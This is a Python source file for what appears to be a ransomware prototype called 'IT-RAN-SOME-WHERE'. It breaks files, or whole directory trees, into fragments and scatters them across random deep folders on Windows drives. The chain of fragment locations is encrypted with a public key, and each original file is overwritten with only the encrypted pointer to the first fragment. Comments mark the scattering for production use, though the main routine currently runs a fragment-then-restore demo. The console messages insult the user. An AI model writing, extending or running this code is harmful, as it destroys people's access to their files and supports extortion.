import os, random, platform, secrets, string
from pathlib import Path
import core.crypto as crypto
import core.colors as colors

# ======================= GLOBAL VARIABLES ====================
FRAGMENT_COUNT = 10
# =============================================================

def find_os():
    system = platform.system()
    return system if system != "Darwin" else "macOS"

def _permission_check(path:str) -> bool:
    file = os.path.join(path, 'whatthefuckisgoingonhere')
    try:
        with open(file, 'xb+') as f:
            pass # do nothing eat 5 star
        os.remove(file)
        return True
    except PermissionError:
        return False

# calculate a random fodler 
def _calculate_random_location() -> str:

    operating_system = find_os()

    # FOR WINDOWS
    if operating_system == "Windows":
        drives = [f"{d}\\" for d in os.listdrives()]
        # depth of the path
        depth = random.randint(4, 9) # (min_depth, max_depth)
        # print(f"[Depth] {depth}")

        # choose the drive
        while True:
            drive = random.choice(drives)
            checks = os.access(drive, os.R_OK)
            if checks:
                break

        # look for deep directories
        path = drive
        for _ in range(depth):
            try:
                dirs = os.listdir(path) # list dirs in current dir
            except:
                continue
            # print(f"Directories here: {dirs}")

            # choose a random dir ensuring read and execute access
            for __ in range(len(dirs)):
                dir = random.choice(dirs)
                path1 = os.path.join(path, dir)
                checks = os.path.isdir(path1) and _permission_check(path1)
                if checks:
                    path = os.path.join(path, dir)
                    # print(f"[Checking] {path} | {checks}")
                    break
                else:
                    dirs.remove(dir)
        
    #TODO: FOR LINUX
    elif operating_system == "Linux":
        pass

    return path if os.path.exists(path) else _calculate_random_location()

# return list of chosen locations to spread the file to
def randomize_fragement_locations(frag_count:int) -> list:
    paths = list()
    for _ in range(frag_count):
        path = _calculate_random_location()
        paths.append(path)

    return paths

def fixed_paths_for_test(frag_count:int) -> list:
    return [Path.home() / "Desktop"]*frag_count

def get_file_size(target:str) -> int:
    with open(target, 'rb') as f:
        return len(f.readlines())

# split the file into 10 fragments [returns the path of the initial fragment]
def fragmentation_file(target:str) -> bool:

    global pubKey

    # get size of the file
    # file_size = get_file_size(target) # number of lines
    file_size = os.path.getsize(target)
    frag_whole_size, frag_remain_size = file_size // FRAGMENT_COUNT, file_size % FRAGMENT_COUNT
    frag_size_array = [frag_whole_size]*FRAGMENT_COUNT
    if frag_remain_size > 0:
        frag_size_array.append(frag_remain_size)

    # calculate the paths
    paths = randomize_fragement_locations(len(frag_size_array))     #! ENABLE THIS IN PRODUCTION PLEASE
    # paths = fixed_paths_for_test(len(frag_size_array))            #! DISABLE THIS IN PRODUCTION PLEASE

    # open the file reference variable
    f1 = open(target, 'rb')

    fragment_names = [''.join((secrets.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) \
                        for _ in range(7))) \
                        for __ in range(len(frag_size_array))]

    # determine the number for frags required: frag or frag+1
    # FRAGMENT_COUNT = FRAGMENT_COUNT if frag_remain_size == 0 else FRAGMENT_COUNT + 1

    init = None
    for i in range(len(frag_size_array)):
        # store the 1/10 of the file
        # r = f1.readlines(frag_size_array[i])
        r = f1.read(frag_size_array[i])

        # frame a random 7 character long fragment name
        # fragment_name = ''.join((secrets.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(7)))
        fragment_path = os.path.join(paths[i], fragment_names[i])

        # print('[enc]', fragment_path)
        # print(fragment_path, r)

        # add_on becomes none during the last iteration
        if i != len(frag_size_array) - 1:
            # file_extension = os.path.basename(target).split('.')[-1]
            # file_extension = os.path.splitext(target)[-1]
            next_path = os.path.join(paths[i+1], fragment_names[i+1])
            # add_on = (next_path + '|' + file_extension + '\n').encode('utf-8')
            # add_on = (next_path + '|' + file_extension).encode('utf-8')
            add_on = next_path.encode('utf-8')
        else:
            # add_on = ('null|null' + '\n').encode('utf-8')
            add_on = 'null'.encode('utf-8')

        # add_on = bytes(os.path.join(paths[i+1], fragment_names[i+1]), 'utf-8') if i < len(frag_size_array) else b'null'
        
        # add the next location in the beginning and write the contents
        with open(fragment_path, 'xb+') as f2:
            # add_on = bytes(os.path.join(paths[i+1], fragment_names[i+1]), 'utf-8')
            # f2.writelines((add_on, b'\n'))
            # f2.writelines(r)
            enc_add_on = crypto.encryption(pubKey, add_on)
            f2.write(enc_add_on + b'\n')
            # f2.write(add_on)
            f2.write(r)
            
        # os.remove(fragment_path) #! to avoid junk while debugging [REMOVE IN PRODUCTION]

        if i == 0:
            init = fragment_path.encode('utf-8')

    # encrypt the intial path
    enc_init = crypto.encryption(pubKey, init).decode('utf-8')

    with open(target, 'w') as f:
        f.write(enc_init)
    
    return True
    # return init

# uses the intial fragment to trace the entire chain and reassemble the 
# def defragmentation_file(init:str) -> None:
def defragmentation_file(target:str) -> bool:

    with open(target, 'r') as f:
        init = f.read()

    global pvtKey

    desktop_path = Path.home() / "Desktop"

    # create a random file name to be saved in the desktop when defragmented
    destination_file_name = ''.join([secrets.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range (10)])
    # destination_file_path = os.path.join(desktop_path, destination_file_name)

    # open the file to be written into
    # f1 = open(destination_file_path, 'wb')
    f1 = open(target, 'wb')


    # begin iteration till the r1 (next path) is foudn to be 'null'
    # r1 = init
    r1 = crypto.decryption(pvtKey, init)
    while r1 != 'null':
        try:
            with open(r1, 'rb') as f:
                r = f.readlines()
        except FileNotFoundError:
            return False

        # print('[dec]', r1)
        os.remove(r1)

        r1 , r2 = r[0], r[1:]
        # decrypt r1 to dec_add_on
        dec_add_on = crypto.decryption(pvtKey, r1)
        # parse r1
        # r1 = r1.decode('utf-8').strip('\n')
        r1 = dec_add_on.decode('utf-8')
        # s = r1.split('|')
        # r1 = s[0]
        # parse file_extension
        # ext = s[1] if s[1] != 'null' else ext
        
        # append contents to the destination
        f1.writelines(r2)

    f1.close()
    # os.rename(destination_file_path, destination_file_path + '.' + ext)

    return True

# enumerate abs path of all the file within the dir recursively and make a tuple of them. then start fragmenting them recursively
def fragmentation_dir(dir_path:str) -> bool:
    if not os.path.isdir(dir_path):
        return False
    
    print()
    
    count = 1
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            abs_file = os.path.abspath(os.path.join(root, file))
            fragmentation_file(abs_file)
            print(f"{colors.BRIGHT_BLUE}[i]{colors.RESET} Number of files fragmented: {count}" + ' '*10, end='\r')
            count += 1
    
    print()

    return True

def defragmentation_dir(dir_path:str) -> True:
    if not os.path.isdir(dir_path):
        return False
    
    print()

    count = 1
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            abs_file = os.path.abspath(os.path.join(root, file))
            defragmentation_file(abs_file)
            print(f"{colors.BRIGHT_BLUE}[i]{colors.RESET} Number of files fragmented: {count}" + ' '*10, end='\r')
            count += 1
    
    print()

    return True

def print_banner():
    print(rf"""{colors.RED}{colors.BOLD}
             IT-RAN-SOME-WHERE              
{colors.RESET}""")


def print_menu():
    print(rf"""{colors.BRIGHT_YELLOW}
+------------------------------------------+{colors.BOLD}
|                 OPTIONS                  |{colors.RESET_BOLD}
+------------------------------------------+
|  1. File                                 |
|  2. Directory                            |
+------------------------------------------+
{colors.RESET}""")

if __name__ == "__main__":

    target = r"E:\Downloads\200.gif"

    global pubKey, pvtKey
    pvtKey, pubKey = crypto.generate_key_pair()

    print_banner()
    print_menu()

    while True:
        try:
            option = int(input("Choose the option: "))
        except:
            print(f"{colors.BRIGHT_YELLOW}[!] Invalid Choice dumbshit. Try using your brain cells, yeah? \n {colors.RESET}")
            continue

        if option == 1:
            target = input("\nSubmit the path of the file to encrypt: ").strip('"\'')
            # file fragmentation part
            if fragmentation_file(target):
                print(f"\n{colors.BRIGHT_GREEN}{colors.BOLD}[✓]{colors.RESET} Fragmentation Successfull{colors.RESET}")

            input(f"{colors.BRIGHT_CYAN}\n[i] Press ENTER to begin defragmentation{colors.RESET}")

            # file defragmentation part
            if defragmentation_file(target):
                print(f"\n{colors.BRIGHT_GREEN}{colors.BOLD}[✓]{colors.RESET} Defragmentation Successfull{colors.RESET}")
            else:
                print(f'\n{colors.BRIGHT_RED}[✗] Oops! You messed with the fragments and now it\'s good as gone.{colors.RESET}')

        elif option == 2:
            target = input("\nSubmit the path of the directory to encrypt: ").strip('"\'')

            # dir fragmentation part
            if fragmentation_dir(target):
                print(f"\n{colors.BRIGHT_GREEN}{colors.BOLD}[✓]{colors.RESET} Fragmentation Successfull{colors.RESET}")
            else:
                print(f"\n{colors.YELLOW}[!] So I am stuck with a piece of shit who can't even differ between a file and directory{colors.RESET}")

            input(f"{colors.BRIGHT_CYAN}\n[i] Press ENTER to begin defragmentation{colors.RESET}")
            
            # dir defragmentation part
            if defragmentation_dir(target):
                print(f"\n{colors.BRIGHT_GREEN}{colors.BOLD}[✓]{colors.RESET} Defragmentation Successfull{colors.RESET}")
            else:
                print(f'\n{colors.BRIGHT_RED}[✗] Oops! You messed with the fragments and now it\'s good as gone.{colors.RESET}')

        else:
            continue
        
        break
    
    input(f"\n{colors.BRIGHT_RED}Press ENTER to exit{colors.RESET}")